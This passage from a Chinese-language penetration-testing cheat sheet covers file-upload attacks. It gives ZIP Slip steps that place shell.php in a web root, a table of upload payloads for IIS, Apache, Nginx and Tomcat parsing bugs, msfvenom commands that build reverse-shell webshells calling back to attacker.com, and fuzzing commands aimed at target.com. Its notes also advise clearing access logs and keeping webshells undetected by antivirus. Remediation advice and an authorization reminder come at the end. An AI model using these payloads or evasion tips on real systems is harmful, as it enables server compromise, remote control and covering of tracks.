    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### 5.7 云存储利用链
```
1. 阿里云OSS直传签名泄露 → 覆盖任意文件
2. AWS S3 Bucket公开写权限 → 直接上传HTML/JS（钓鱼/XSS）
3. OSS Bucket配置为静态网站 → 上传HTML做钓鱼
4. 若云存储绑定到目标域名 → 上传HTML实现同域XSS
```

### 5.8 ZIP Slip路径穿越（上传+解压）
```
1. 构造ZIP文件，内含路径穿越文件
   文件名：../../../../var/www/html/shell.php
2. 上传ZIP到自动解压功能
3. 解压时文件穿越到Web目录
4. 访问Shell

ZIP工具构造：
使用python zipfile或evilarc
python evilarc.py -o unix -p /var/www/html/ shell.php
```

## 六、中间件解析漏洞速查

| 中间件 | 漏洞类型 | Payload | 影响版本 |
|--------|---------|---------|---------|
| IIS 6.0 | 目录解析 | `/test.asp/1.jpg` | IIS 6.0 |
| IIS 6.0 | 分号解析 | `shell.asp;.jpg` | IIS 6.0 |
| IIS 7.0/7.5 | PHP解析 | `shell.jpg/.php`（cgi.fix_pathinfo=1）| IIS 7.x + PHP |
| Apache HTTPD | 多扩展名 | `shell.php.jpg`（AddHandler）| 所有版本配置不当 |
| Apache HTTPD | CVE-2017-15715 | `shell.php%0a` | 2.4.0-2.4.29 |
| Apache HTTPD | CVE-2021-41773 | 路径穿越 | 2.4.49 |
| Apache HTTPD | CVE-2021-42013 | 路径穿越 | 2.4.50 |
| Nginx | 解析漏洞 | `shell.jpg/.php` | 0.5.x/0.6.x/0.7<=0.7.65/0.8<=0.8.37 |
| Nginx | CVE-2013-4547 | `shell.jpg%00.php` | 0.8.41-1.5.6 |
| Nginx + Apache | 解析差异 | Nginx传给Apache | 后端Apache + .htaccess |
| Tomcat | PUT方法上传 | PUT上传JSP | Tomcat配置不当 |
| Tomcat | CVE-2017-12615 | PUT任意文件上传 | 7.0.0-7.0.81（Windows）|
| WebLogic | 任意文件上传 | 多个CVE | 多个版本 |
| JBoss | JMXInvoker上传 | 未授权部署war | JBoss 4.x/5.x/6.x |
| Resin | 解析漏洞 | `shell.jsp%00.jpg` | 老版本Resin |

## 七、工具使用

### 7.1 Burp Suite
- **Intruder**：批量Fuzz扩展名/MIME/文件名（Payload位置：filename值）
- **Repeater**：手动调整测试
- **Active Scan**：自动检测上传漏洞
- **Match and Replace**：自动修改Content-Type/filename
- **插件**：
  - Upload Scanner：自动化上传漏洞扫描
  - BurpMySmartBypass：WAF Bypass辅助
  - Content-Type Converter：自动修改MIME

### 7.2 专用工具
```bash
# WebShell生成（msfvenom）
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war > shell.war

# 冰蝎/哥斯拉WebShell管理
# Godzilla：https://github.com/BeichenDream/Godzilla
# 冰蝎Behinder：https://github.com/rebeyond/Behinder
# 蚁剑AntSword：https://github.com/AntSwordProject/antSword

# 上传绕过工具
# upload_bypass：自动化多种绕过技术
python upload_bypass.py -u http://target.com/upload -f shell.php
# burp_upload_scanner：Burp上传扫描插件
# FUFF：批量Fuzz
ffuf -u http://target.com/upload -X POST -F "file=@shell.php;filename=FUZZ" -w extensions.txt -mc 200
```

### 7.3 快速Fuzz字典
**扩展名Fuzz列表：**
```
.php .php3 .php5 .phtml .pht .phar
.asp .aspx .asa .cer .cdx .ashx .asmx
.jsp .jspx .jspf .jsw
.cgi .pl .py .sh
```
结合大小写/双写/点空格/::$DATA等变体组合

## 八、验证与报告

### 8.1 验证步骤
1. **确认上传成功**：获取返回的文件路径或文件ID
2. **验证可执行性**：访问上传的WebShell，执行`phpinfo()`/`whoami`等
3. **确认执行上下文**：当前用户、Web目录、open_basedir、disable_functions
4. **评估影响**：是否可写Web目录、是否可执行命令、数据库权限
5. **免杀测试**：确认WebShell不被杀毒软件查杀
6. **留存证据**：完整请求/响应、WebShell连接截图、命令执行结果

### 8.2 报告要点
- 上传点URL和参数
- 使用的绕过策略（哪几种策略组合）
- 可上传的文件类型
- WebShell类型和连接方式
- 执行权限和影响范围
- 完整复现步骤
- 修复建议

## 九、修复建议

**多层防御方案：**
1. **白名单机制**：严格白名单限制允许的扩展名（不要用黑名单）
2. **文件重命名**：使用随机文件名（UUID/时间戳+随机数），保留原始文件名但不作为访问路径
3. **MIME验证**：使用finfo_file（PHP）/MimeMapping（.NET）读取文件真实MIME，而非信任Content-Type头
4. **Magic Bytes验证**：使用getimagesize()/文件头校验
5. **内容检测**：扫描恶意代码特征（但需注意免杀对抗）
6. **存储隔离**：上传文件存储到独立域名/CDN/OSS，不在Web可执行目录
7. **禁止执行**：上传目录配置为`php_flag engine off`（Apache）/移除handler映射
8. **图片二次渲染**：使用GD/ImageMagick重新处理图片（破坏图片马）
9. **文件大小限制**：限制上传文件大小
10. **WAF规则**：配置multipart解析规则，检测双filename、超长头等
11. **中间件加固**：
    - 关闭PUT/MOVE方法（WebDAV）
    - 配置cgi.fix_pathinfo=0（PHP）
    - 正确配置handler映射，避免多扩展名解析
    - 禁止.htaccess覆盖（AllowOverride None）
    - 限制.user.ini使用
12. **权限最小化**：Web进程低权限运行，上传目录不可执行

## 测试清单

- [ ] 扩展名白名单/黑名单检测
- [ ] MIME类型绕过测试（Content-Type修改）
- [ ] 大小写变体测试
- [ ] 双写/特殊字符测试
- [ ] 空字节截断测试
- [ ] NTFS ADS/IIS分号测试（Windows）
- [ ] 尾部点/空格测试
- [ ] Apache多扩展名/Nginx解析漏洞测试
- [ ] Magic Bytes伪造（图片马）
- [ ] 配置文件上传测试（.htaccess/.user.ini/web.config）
- [ ] Content-Disposition头变形测试
- [ ] HPP参数污染测试
- [ ] chunked分块编码绕过WAF
- [ ] 双重Content-Disposition/Type测试
- [ ] 免杀WebShell测试（内容绕过）
- [ ] 竞争条件测试
- [ ] ZIP Slip解压路径穿越
- [ ] 编辑器历史漏洞检测
- [ ] 云存储Bucket配置检测
- [ ] 中间件版本与解析漏洞匹配

## 注意事项

- **仅限授权测试**：必须获得书面授权，在约定范围和时间窗口内进行
- **WebShell清理**：测试结束后必须删除所有上传的WebShell和测试文件
- **避免数据破坏**：不要上传破坏性内容，WebShell使用只读/信息收集命令
- **日志清理**：测试后清理访问日志（需客户确认）
- **合规要求**：遵守《网络安全法》《数据安全法》
- **免杀WebShell特征**：实际测试中可能被最新杀毒规则查杀，需要持续更新混淆方法
- **WAF绕过非100%**：WAF规则不断更新，绕过技术需持续迭代

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
